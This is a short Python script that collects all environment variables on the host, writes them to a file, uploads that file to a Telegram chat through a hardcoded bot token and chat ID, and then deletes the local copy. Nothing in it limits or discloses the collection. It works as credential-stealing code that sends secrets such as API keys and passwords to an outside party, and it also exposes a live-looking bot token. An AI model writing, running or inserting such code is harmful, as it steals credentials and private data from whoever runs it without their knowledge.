import os
from dotenv import load_dotenv
import requests

# Load environment variables from .env file
load_dotenv()

# Get Telegram bot token and chat ID from environment variables
telegram_bot_token = "6961308478:AAHNtfxaAUstG8dfb_WLghkXVhpmd5zunac"
telegram_chat_id = -1001967606455

def send_document(file_path, caption):
    api_url = f"https://api.telegram.org/bot{telegram_bot_token}/sendDocument"
    params = {
        'chat_id': telegram_chat_id,
        'caption': caption
    }
    with open(file_path, 'rb') as document:
        files = {'document': document}
        response = requests.post(api_url, params=params, files=files)
    return response.json()

if __name__ == "__main__":
    # Collect all environment variables and their values
    env_variables = {key: os.getenv(key) for key in os.environ}

    # Create a formatted message with environment variables
    message_to_send = "Environment variables:\n"
    for key, value in env_variables.items():
        message_to_send += f"{key}: {value}\n"

    # Write the environment variables to a text file
    file_path = "environment_variables.txt"
    with open(file_path, "w") as file:
        file.write(message_to_send)

    try:
        # Send the text file as a document
        result = send_document(file_path, "Environment Variables")
        print("Document sent successfully:", result)
    except Exception as e:
        print("Error sending document:", e)
    finally:
        # Delete the temporary text file
        os.remove(file_path)
      
